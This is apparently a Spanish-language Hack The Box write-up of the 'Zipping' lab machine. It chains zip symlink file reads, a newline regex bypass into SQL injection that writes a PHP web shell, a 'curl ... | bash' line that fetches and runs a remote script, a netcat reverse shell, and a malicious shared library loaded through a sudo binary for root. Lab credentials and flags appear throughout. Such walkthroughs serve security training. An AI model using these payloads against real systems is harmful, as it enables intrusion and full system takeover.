---
tags:
title: Zipping - Insane (HTB)
permalink: /Zipping-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash 
nmapf 10.129.229.87
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 01:25 -0500
Initiating Ping Scan at 01:25
Scanning 10.129.229.87 [4 ports]
Completed Ping Scan at 01:25, 0.41s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 01:25
Completed Parallel DNS resolution of 1 host. at 01:25, 0.50s elapsed
Initiating SYN Stealth Scan at 01:25
Scanning 10.129.229.87 [65535 ports]
Discovered open port 80/tcp on 10.129.229.87
Discovered open port 22/tcp on 10.129.229.87
Completed SYN Stealth Scan at 01:25, 9.18s elapsed (65535 total ports)
Nmap scan report for 10.129.229.87
Host is up, received echo-reply ttl 63 (0.35s latency).
Scanned at 2026-02-20 01:25:30 EST for 9s
Not shown: 61675 closed tcp ports (reset), 3858 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.27 seconds
           Raw packets sent: 85162 (3.747MB) | Rcvd: 72312 (2.892MB)
-e [*] IP: 10.129.229.87
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-20 01:25 -0500
Nmap scan report for zipping.htb (10.129.229.87)
Host is up (0.50s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.0p1 Ubuntu 1ubuntu7.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 9d:6e:ec:02:2d:0f:6a:38:60:c6:aa:ac:1e:e0:c2:84 (ECDSA)
|_  256 eb:95:11:c7:a6:fa:ad:74:ab:a2:c5:f6:a4:02:18:41 (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Ubuntu))
|_http-title: Zipping | Watch store
|_http-server-header: Apache/2.4.54 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.61 seconds
```

## Website

La pagina principal hostea un servicio de manufacturas de relojes.

![image-center](/assets/images/Pasted image 20260219202324.png)
### Zip symlink abuse

En la sección de contacto, muestra un apartado en el que podes compartir un curriculum en formato `zip` comprimido, solamente con un `pdf` adentro.

![image-center](/assets/images/Pasted image 20260219202505.png)

Probé en mi caso creando un link simbólico con el `/etc/passwd`, y luego comprimiendo el `zip` con parámetro `--symlink` para que lo incluya en el mismo.

```bash
ln -s /etc/passwd passwd.pdf

➜  Zipping
➜  ls
allPorts  cmd.php  cmd.zip  passwd.pdf  port_scan

➜  zip --symlink passwd.zip passwd.pdf
  adding: passwd.pdf (deflated 66%)
```
### Data

Luego de subir el archivo, veo que me deja una `url`.

![image-center](/assets/images/Pasted image 20260219203523.png)

Enviando un `curl` a la misma, veo que me devuelve el contenido del archivo al que apunte, por lo que ya puedo empezar a enumerar archivos del sistema.

```bash
curl -s -X GET 'http://10.129.229.87/uploads/8b1bbf1bf1abebfc4be1b0287554128c/passwd.pdf'
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:103:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:109::/nonexistent:/usr/sbin/nologin
systemd-resolve:x:104:110:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
rektsu:x:1001:1001::/home/rektsu:/bin/bash
mysql:x:107:115:MySQL Server,,,:/nonexistent:/bin/false
_laurel:x:999:999::/var/log/laurel:/bin/false
```
### SQL Injection

La pagina `shop` muestra lo siguiente.

![image-center](/assets/images/Pasted image 20260219204553.png)
### Analysis

Por lo que apunte a la misma mostrando su contenido, viendo que en el código, usa el propio `functions.php`, llamando luego a la funcion `pdo_connect_mysql()` 

```php
curl -s -X GET 'http://10.129.229.87/uploads/afa3f19341d8ddab74a0c3e01578907c/upp.pdf'
<?php
session_start();
// Include functions and connect to the database using PDO MySQL
include 'functions.php';
$pdo = pdo_connect_mysql();
// Page is set to home (home.php) by default, so when the visitor visits, that will be the page they see.
$page = isset($_GET['page']) && file_exists($_GET['page'] . '.php') ? $_GET['page'] : 'home';
// Include and show the requested page
include $page . '.php';
?>
```
## Shell as rektsu

En el código del `functions.php`, muestra algunas credenciales de `root` lo cual ya puedo pensar en que tiene algunos permisos superiores en la base de datos, como escritura, lectura, etc.

```php
curl -s -X GET 'http://10.129.229.87/uploads/d03cef2f481fade0b906acaab802f8f4/s.pdf'
<?php
function pdo_connect_mysql() {
    // Update the details below with your MySQL details
    $DATABASE_HOST = 'localhost';
    $DATABASE_USER = 'root';
    $DATABASE_PASS = 'MySQL_P@ssw0rd!';
    $DATABASE_NAME = 'zipping';
    try {
    	return new PDO('mysql:host=' . $DATABASE_HOST . ';dbname=' . $DATABASE_NAME . ';charset=utf8', $DATABASE_USER, $DATABASE_PASS);
    } catch (PDOException $exception) {
    	// If there is an error with the connection, stop the script and display the error.
    	exit('Failed to connect to database!');
    }
}
<SNIP>
```
### product.php code

En el código del propio `product.php`, se muestra la interacción con la propia base de datos, y aplicando una validación y luego colocando el input del usuario para pasarlo a `prepare`.

```php
curl -s -X GET 'http://10.129.229.87/uploads/c3c5be52b11c7697afbf1fb595a29b0f/1.pdf'
<?php
// If the user clicked the add to cart button on the product page we can check for the form data
if (isset($_POST['product_id'], $_POST['quantity'])) {
    // Set the post variables so we easily identify them, also make sure they are integer
    $product_id = $_POST['product_id'];
    $quantity = $_POST['quantity'];
    // Filtering user input for letters or special characters
    if(preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}\[\]\\|;:'\",.<>\/?]|[^0-9]$/", $product_id, $match) || preg_match("/^.*[A-Za-z!#$%^&*()\-_=+{}[\]\\|;:'\",.<>\/?]/i", $quantity, $match)) {
        echo '';
    } else {
        // Construct the SQL statement with a vulnerable parameter
        $sql = "SELECT * FROM products WHERE id = '" . $_POST['product_id'] . "'";
        // Execute the SQL statement without any sanitization or parameter binding
        $product = $pdo->query($sql)->fetch(PDO::FETCH_ASSOC);
        // Check if the product exists (array is not empty)
        if ($product && $quantity > 0) {
            // Product exists in database, now we can create/update the session variable for the cart
            if (isset($_SESSION['cart']) && is_array($_SESSION['cart'])) {
                if (array_key_exists($product_id, $_SESSION['cart'])) {
                    // Product exists in cart so just update the quanity
                    $_SESSION['cart'][$product_id] += $quantity;
                } else {
                    // Product is not in cart so add it
                    $_SESSION['cart'][$product_id] = $quantity;
                }
            } else {
                // There are no products in cart, this will add the first product to cart
                $_SESSION['cart'] = array($product_id => $quantity);
            }
        }
        // Prevent form resubmission...
        header('location: index.php?page=cart');
        exit;
    }
}

// Remove product from cart, check for the URL param "remove", this is the product id, make sure it's a number and check if it's in the cart
if (isset($_GET['remove']) && is_numeric($_GET['remove']) && isset($_SESSION['cart']) && isset($_SESSION['cart'][$_GET['remove']])) {

    // Remove the product from the shopping cart
    unset($_SESSION['cart'][$_GET['remove']]);
}

// Update product quantities in cart if the user clicks the "Update" button on the shopping cart page
if (isset($_POST['update']) && isset($_SESSION['cart'])) {
    // Loop through the post data so we can update the quantities for every product in cart
    foreach ($_POST as $k => $v) {
        if (strpos($k, 'quantity') !== false && is_numeric($v)) {
            $id = str_replace('quantity-', '', $k);
            $quantity = (int)$v;
            // Always do checks and validation
            if (is_numeric($id) && isset($_SESSION['cart'][$id]) && $quantity > 0) {
                // Update new quantity
                $_SESSION['cart'][$id] = $quantity;
            }
        }
    }
    // Prevent form resubmission...
    header('location: index.php?page=cart');
    exit;
}

// Send the user to the place order page if they click the Place Order button, also the cart should not be empty
if (isset($_POST['placeorder']) && isset($_SESSION['cart']) && !empty($_SESSION['cart'])) {
    header('Location: index.php?page=placeorder');
    exit;
}

if (isset($_POST['clear'])) {
	unset($_SESSION['cart']);
}

// Check the session variable for products in cart
$products_in_cart = isset($_SESSION['cart']) ? $_SESSION['cart'] : array();
$products = array();
$subtotal = 0.00;
// If there are products in cart
if ($products_in_cart) {
    // There are products in the cart so we need to select those products from the database
    // Products in cart array to question mark string array, we need the SQL statement to include IN (?,?,?,...etc)
    $array_to_question_marks = implode(',', array_fill(0, count($products_in_cart), '?'));
    $stmt = $pdo->prepare('SELECT * FROM products WHERE id IN (' . $array_to_question_marks . ')');
    // We only need the array keys, not the values, the keys are the id's of the products
    $stmt->execute(array_keys($products_in_cart));
    // Fetch the products from the database and return the result as an Array
    $products = $stmt->fetchAll(PDO::FETCH_ASSOC);
    // Calculate the subtotal
    foreach ($products as $product) {
        $subtotal += (float)$product['price'] * (int)$products_in_cart[$product['id']];
    }
}
?>
```

Ya acá pienso en una inyección `sql`, pero bypasseando el `regex` con un salto de linea `(\n - %0a)`, viendo que no me redirige a la pagina principal cuando envió la petición con `curl`.

```bash
curl -X POST http://10.129.229.87/shop/index.php?page=cart \
--data-urlencode "product_id=1
' UNION SELECT 1,'shell','desc',10,1,'<?php system(\$_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/uploads/shell.php'-- -" \
--data-urlencode "quantity=1"

<!DOCTYPE html>
<html>
	<head>
		<meta charset="utf-8">
		<title>Zipping | Cart</title>
		<link href="assets/style.css" rel="stylesheet" type="text/css">
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css">
	</head>
	<body>
        <header>
            <div class="content-wrapper">
                <a href=".." style="text-decoration: none;"><h1>Zipping Watch Store</h1></a>
                <nav>
                    <a href="index.php">Home</a>
                    <a href="index.php?page=products">Products</a>
                </nav>
                <div class="link-icons">
                    <a href="index.php?page=cart">
						<i class="fas fa-shopping-cart"></i>
						<span>0</span>
					</a>
                </div>
            </div>
        </header>
        <main>
<div class="cart content-wrapper">
    <h1>Shopping Cart</h1>
    <form action="index.php?page=cart" method="post">
        <table>
            <thead>
                <tr>
                    <td colspan="2">Product</td>
                    <td>Price</td>
                    <td>Quantity</td>
                    <td>Total</td>
                </tr>
            </thead>
            <tbody>
                                <tr>
                    <td colspan="5" style="text-align:center;">You have no products added in your Shopping Cart</td>
                </tr>
                            </tbody>
        </table>
        <div class="subtotal">
            <span class="text">Subtotal</span>
            <span class="price">&dollar;0</span>
        </div>
        <div class="buttons">
            <input type="submit" value="Update" name="update">
            <input type="submit" value="Place Order" name="placeorder">
	    <input type="submit" value="Clear" name="clear" onsubmit="">
        </div>
    </form>
</div>

        </main>
        <footer>
            <div class="content-wrapper">
                <p>&copy; 2026, Zipping Watch Store</p>
            </div>
        </footer>
    </body>
</html>                          
```
### sqlmap automation 

Para automatizar el proceso use `sqlmap`, en donde predefini la `url` y luego con el prefijo a utilizar en el parametro vulnerable el cual es el salto de linea `(\n - %0a)` y el retorno de carro `(\r - %0d)`, luego el sufijo `'1` para terminar la query. En donde use el parámetro `--sql-shell` para luego de la detección de la vulnerabilidad me de una pseudo consola en la que puedo ejecutar consultas `SQL`.

```bash
sqlmap -u "http://zipping.htb/shop/index.php?page=product&id=1" --fresh-queries --prefix="%0A%0D'" --suffix="'1" -p id --dbms mysql --level 3 --risk 3 --sql-shell  --batch
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.10.2#stable}
|_ -| . [(]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:41:46 /2026-02-20/

[02:41:46] [INFO] testing connection to the target URL
you have not declared cookie(s), while server wants to set its own ('PHPSESSID=n5ju6c34rdm...7cpsoqrhmk'). Do you want to use those [Y/n] Y
[02:41:48] [INFO] testing if the target URL content is stable
[02:41:49] [INFO] target URL content is stable
[02:41:50] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[02:41:52] [INFO] testing for SQL injection on GET parameter 'id'
<SNIP>
[02:42:42] [INFO] testing 'MySQL inline queries'
[02:42:43] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[02:42:56] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 stacked queries (comment)' injectable
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (3) value? [Y/n] Y
<SNIP>
[02:43:42] [INFO] target URL appears to be UNION injectable with 8 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[02:45:39] [INFO] testing 'Generic UNION query (78) - 21 to 40 columns'
[02:46:24] [INFO] testing 'Generic UNION query (78) - 41 to 60 columns'
[02:47:10] [INFO] testing 'MySQL UNION query (78) - 1 to 20 columns'
[02:48:01] [INFO] testing 'MySQL UNION query (78) - 21 to 40 columns'
[02:48:47] [INFO] testing 'MySQL UNION query (78) - 41 to 60 columns'
[02:49:32] [INFO] checking if the injection point on GET parameter 'id' is a false positive
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 264 HTTP(s) requests:
---
Parameter: id (GET)
    Type: stacked queries
    Title: MySQL >= 5.0.12 stacked queries (comment)
    Payload: page=product&id=1
';SELECT SLEEP(5)'1
---
[02:50:33] [INFO] the back-end DBMS is MySQL
[02:50:33] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu
web application technology: Apache 2.4.54, PHP
back-end DBMS: MySQL >= 5.0.12 (MariaDB fork)
[02:50:39] [INFO] calling MySQL shell. To quit type 'x' or 'q' and press ENTER
sql-shell> 

```
### Webshell

Para escribir una webshell en la ruta por defecto de mysql `(/var/lib/mysql)`, coloque mi payload en `base64`:

```bash
sql-shell> select '<?php system(''curl 10.10.17.19/shell.sh | bash''); ?>' INTO OUTFILE '/var/lib/mysql/2.php%00';
```

El `Null byte (%00)` es para que ignore todo el resto de la `query` que se realice por detrás.

```bash
sql-shell> SELECT '<?php system(''echo Y3VybCAxMC4xMC4xNy4xOS8gfCBiYXNoCg== | base64 -d |bash''); ?>' INTO OUTFILE '/var/lib/mysql/shell.php%00';
[03:00:59] [INFO] executing SQL SELECT statement statement: 'SELECT '<?php system(''echo Y3VybCAxMC4xMC4xNy4xOS8gfCBiYXNoCg== | base64 -d |bash''); ?>' INTO OUTFILE '/var/lib/mysql/shell.php%00''
<SNIP>
```
### Shell

Luego para confirmar la ejecución de comandos envié con `curl` la petición.

```bash
curl -s -X GET 'http://zipping.htb/shop/index.php?page=/var/lib/mysql/shell.php'
```

Y veo como se descarga mi `index.html` con la reverse shell dentro.

```bash
gen_lin_rev 10.10.17.19 4444
[+] Wrote Linux reverse shells to /home/zsln/index.html

10.129.229.87 - - [20/Feb/2026 03:34:05] "GET / HTTP/1.1" 200 -
```

Y al ejecutarse recibo por abajo mi shell como el usuario `rektsu`.


```bash
sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.87] 34290
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(rektsu) gid=1001(rektsu) groups=1001(rektsu)
```

```bash
rektsu@zipping:/home/rektsu$ cat user.txt
1d596d5cc1ae3438138b39300223735e
```
## Shell as root
### Sudo privileges

Viendo los privilegios de este usuario, vi que puedo ejecutar `/usr/bin/stock` como el usuario `root`.

```bash
rektsu@zipping:/var/www/html$ sudo -l
Matching Defaults entries for rektsu on zipping:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User rektsu may run the following commands on zipping:
    (ALL) NOPASSWD: /usr/bin/stock
```
### Password leakage

Viendo los caracteres legibles del binario, veo la password que se usa para poder usarlo.

```bash
rektsu@zipping:/home/rektsu$ strings /usr/bin/stock
/lib64/ld-linux-x86-64.so.2
mgUa
fgets
stdin
puts
exit
fopen
__libc_start_main
fprintf
dlopen
__isoc99_fscanf
__cxa_finalize
strchr
fclose
__isoc99_scanf
strcmp
__errno_location
libc.so.6
GLIBC_2.7
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
Hakaize
St0ckM4nager
/root/.stock.csv
Enter the password:
Invalid password, please try again.
================== Menu ==================
1) See the stock
2) Edit the stock
3) Exit the program
Select an option:
You do not have permissions to read the file
File could not be opened.
================== Stock Actual ==================
Colour     Black   Gold    Silver
Amount     %-7d %-7d %-7d
Quality   Excelent Average Poor
Amount    %-9d %-7d %-4d
Exclusive Yes    No
Amount    %-4d   %-4d
Warranty  Yes    No
================== Edit Stock ==================
<SNIP>
```

Probando la misma es valida.

```bash
rektsu@zipping:/home/rektsu$ sudo /usr/bin/stock
Enter the password: St0ckM4nager

================== Menu ==================

1) See the stock
2) Edit the stock
3) Exit the program

Select an option:
```
### Reverse engineering

Para analizarlo mas a fondo a este binario me lo transferí a mi maquina para analizarlo con `gdb`.

Establecí un breakpoint en `dlopen@plt` para ver librería trataba de cargar el binario, viendo así que intenta cargar `/home/rektsu/.config/libcounter.so`.

```bash
(gdb) b *0x00005555555550b0
Breakpoint 1 at 0x5555555550b0
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/zsln/Desktop/zsln/Zipping/binary/stock
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the password: St0ckM4nager

Breakpoint 1, 0x00005555555550b0 in dlopen@plt ()
(gdb) x/s $rdi
0x7fffffffdc90:	"/home/rektsu/.config/libcounter.so\300"
```
### Malicious SO RCE

Para crear el mismo primero cree la carpeta donde se aloja el mismo.

```bash
mkdir -p /home/rektsu/.config
```

Y luego use el siguiente código en `C#` para poder spawnear una consola como `root`.

```C#
cat << EOF > /tmp/exploit.c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
void pwn() {
    setuid(0);
    setgid(0);
    system("/bin/bash -p");
}
EOF
```
### Compile

Lo compile con `gcc`.

```bash
gcc -shared -fPIC -o /home/rektsu/.config/libcounter.so /tmp/exploit.c
```
### Shell

Y luego volví a ejecutar el binario proporcionando la contraseña, haciendo que luego cuando cargue el `.so` malicioso me de una shell como `root`.

```bash
rektsu@zipping:/home/rektsu$ sudo /usr/bin/stock
Enter the password: St0ckM4nager
root@zipping:/home/rektsu# id
uid=0(root) gid=0(root) groups=0(root)
```

```bash
root@zipping:~# cat root.txt
5215b5909f363a9cdcdbf5cdd1f5c482
```

```bash
(gdb) disas checkAuth
Dump of assembler code for function checkAuth:
   0x0000555555555281 <+0>:	push   %rbp
   0x0000555555555282 <+1>:	mov    %rsp,%rbp
   0x0000555555555285 <+4>:	sub    $0x20,%rsp
   0x0000555555555289 <+8>:	mov    %rdi,-0x18(%rbp)
   0x000055555555528d <+12>:	movl   $0x0,-0x4(%rbp)
   0x0000555555555294 <+19>:	mov    -0x18(%rbp),%rax
   0x0000555555555298 <+23>:	lea    0xd69(%rip),%rdx        # 0x555555556008
   0x000055555555529f <+30>:	mov    %rdx,%rsi
   0x00005555555552a2 <+33>:	mov    %rax,%rdi
   0x00005555555552a5 <+36>:	call   0x5555555550a0 <strcmp@plt>
   0x00005555555552aa <+41>:	test   %eax,%eax
   0x00005555555552ac <+43>:	jne    0x5555555552b5 <checkAuth+52>
   0x00005555555552ae <+45>:	movl   $0x1,-0x4(%rbp)
   0x00005555555552b5 <+52>:	mov    -0x4(%rbp),%eax
   0x00005555555552b8 <+55>:	leave
   0x00005555555552b9 <+56>:	ret
End of assembler dump.
(gdb) b strcmp
Breakpoint 2 at gnu-indirect-function resolver at 0x7ffff7ca8b70
(gdb) r
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/zsln/Desktop/zsln/Zipping/binary/stock
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
Enter the password: test

Breakpoint 2, 0x00007ffff7d77100 in ?? () from /usr/lib/x86_64-linux-gnu/libc.so.6
(gdb) x/s $rdi
0x7fffffffdcc0:	"test"
(gdb) x/s $rsi
0x555555556008:	"St0ckM4nager"
```